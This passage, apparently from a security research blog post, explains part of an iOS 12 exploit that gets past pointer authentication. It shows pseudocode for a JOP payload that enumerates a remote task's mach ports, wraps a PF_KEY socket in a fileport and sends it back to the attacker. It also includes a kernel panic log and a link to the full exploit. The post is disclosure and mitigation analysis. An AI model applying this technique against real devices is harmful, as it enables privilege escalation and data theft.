Unix domain sockets are the canonical way to send file descriptors between processes on UNIX OSs. This is possible on iOS, indeed see [P0 issue 1123](https://bugs.chromium.org/p/project-zero/issues/detail?id=1123) for a bug involving them. But we have an alternative:  XNU has the concept of a file\_port, a mach port which wraps a file descriptor. We can use this to easily send a socket file descriptor from the remote task back to ourselves.

## remote space introspection

In earlier exploits like [triple\_fetch](https://bugs.chromium.org/p/project-zero/issues/detail?id=1247) I sprayed mach port send rights into the target then guessed their names in order to send mach messages back to the attacking process. Apple have since introduced some randomization into mach port names. The generation number now wraps randomly at either 16, 32, 48 or 64. This makes guessing remote mach port names less reliable.

Given that we can chain together arbitrary function calls, what if we just remotely enumerate the mach port namespace in the target and find the name of a sprayed mach port send right in a more deterministic way?

Here's the prototype for mach\_port\_space\_info:

kern\_return\_t mach\_port\_space\_info(

ipc\_space\_inspect\_t task,

ipc\_info\_space\_t \*space\_info,

ipc\_info\_name\_array\_t \*table\_info,

mach\_msg\_type\_number\_t \*table\_infoCnt,

ipc\_info\_tree\_name\_array\_t \*tree\_info,

mach\_msg\_type\_number\_t \*tree\_infoCnt);

For the given task port this method will return a descriptor for each mach port name in that task's mach port namespace, containing the port's name, the rights the task has and so on.

It might seem at first glance like this method would be hard to call given the limitations of our loop-call gadget (only 4 arguments, and the second only 32-bit.) The insight here is that this function is just a MIG generated serialization function. The functionality is really reached by sending a mach message to the task port, something which can be achieved by calling mach\_msg\_send which only requires control of one argument.

By sending a mach message to the task\_self port with a msgh\_id value of 3223 and a valid reply port then receiving the reply via mach\_msg\_receive we can get an out-of-line descriptor containing all the task's mach port names. We can use the indirect add and memory copy gadgets to read a sprayed mach port name from the mach\_port\_space\_info reply message and send a message containing a file\_port containing the PF\_KEY socket to it.

The heap spray also contains two skeleton mach messages which the payload uses, one for mach\_port\_space\_info and one for sending the file\_port back to the attacker. Here's a pseudo-code implementation of the entire payload functionality; take a look at the real payload in unPACker.c to see this pseudocode translated into the JOP macros.

// make sure the mach\_port\_space\_info has

// the right name for the task port

\*task\_port = ret\_wrapper(task\_self\_trap())

// get the thread's mig reply port

\*reply\_port = ret\_wrapper(mig\_get\_reply\_port())

// write those two values into the correct places

memory\_move(mach\_port\_space\_info\_msg.remote\_port, task\_port)

memory\_move(mach\_port\_space\_info\_msg.local\_port, reply\_port)

// send the mach\_port\_space\_info request

mach\_msg\_send(mach\_port\_space\_info\_msg)

// fill in the reply port name in the reply message

memory\_move(port\_space\_reply.local\_port, reply\_port)

// receive a reply

mach\_msg\_receive(port\_space\_reply)

// the port space is guaranteed to be at least as large

// as the number of ports we sent, so add that number\*4\*7

// to the received OOL desc pointer

add\_indirect(port\_space\_reply.ool.address, 4\*7\*0x1000)

// now we can be pretty sure that this port name is

// a send right back to the attacker

memory\_move(exfil\_msg.remote\_port, port\_space\_reply.ool.address)

//this socket write should go to the correct place for the next call:

\*socket = ret\_wrapper(socket(X,Y,Z))

// need to call fileport\_makeport(fd, &port), so need arbitrary x1

// can get that via the TINY\_RET\_WRAPPER

\*fileport = arbitrary\_x1(fileport\_makeport, socket, &fileport)

// write the fileport into the exfil message

memory\_move(exfil\_msg.port\_desc.name, fileport)

// send the exfil message

mach\_msg\_send(exfil\_msg)

In the sender we then wait to receive a message on a portset containing the sprayed send rights; if we receive a message before we timeout then we read the fileport from it, extract the fd, and trigger the PF\_KEY kernel bug!

panic(cpu 1 caller 0xfffffff0156b8578): "a freed zone element has been modified in zone kalloc.80: expected 0 but found 0x5c539a7c41414141, bits changed 0x5c539a7c41414141, at offset 0 of 80 in element 0xffffffe00394b3e0, cookies 0x3f0011f52a19c140 0x53521b0207bb71b"

Debugger message: panic

Memory ID: 0xff

OS version: 16A366

Kernel version: Darwin Kernel Version 18.0.0: Tue Aug 14 22:07:18 PDT 2018; root:xnu-4903.202.2~1\\/RELEASE\_ARM64\_T8020

You can download the exploit targeting iOS 12.0 on iPhone Xs [here](https://bugs.chromium.org/p/project-zero/issues/detail?id=1728#c4).

## Conclusions

It's rare that mitigations ship with documentation detailing exactly what their purpose is. Is it trying to make a certain exploitation technique less reliable? Is it trying to eradicate a vulnerability class? Is it trying to break an exploit chain?

PAC, as currently implemented, doesn't present much of a barrier for an attacker with local code execution and a memory corruption primitive looking to escalate privileges within userspace. This was also probably not the attack model which PAC in iOS 12 was intended to defend against, but without any documentation from Apple we don't know for sure. It's important to emphasize that the private data which most users want to protect is almost all, at some point, found in userspace.

It's also important to mention that this exploit was very contrived. Firstly, turning the virtual memory logic bug into memory corruption is probably the least interesting thing you could do with it. Finding other logical consequences caused by the unexpected shared memory would be more interesting (maybe a double read of a string used as a selector?) but I just wanted a memory corruption primitive so I could experiment with PAC's resilience to memory corruption in a userspace context and I didn't have any other bugs.

Secondly, gaining PC control is probably also unnecessary. Again, this was done to demonstrate that it's still possible to chain arbitrary function calls together quite easily even with PAC. Stealing resources such as file descriptors or mach ports from remote processes without direct PC control would also be quite possible.

It's hard to call something a PAC defeat without knowing what PAC is supposed to defend against, and it's hard to say that something like PAC "raises the bar" without knowing whether anyone really has to cross that bar anyway.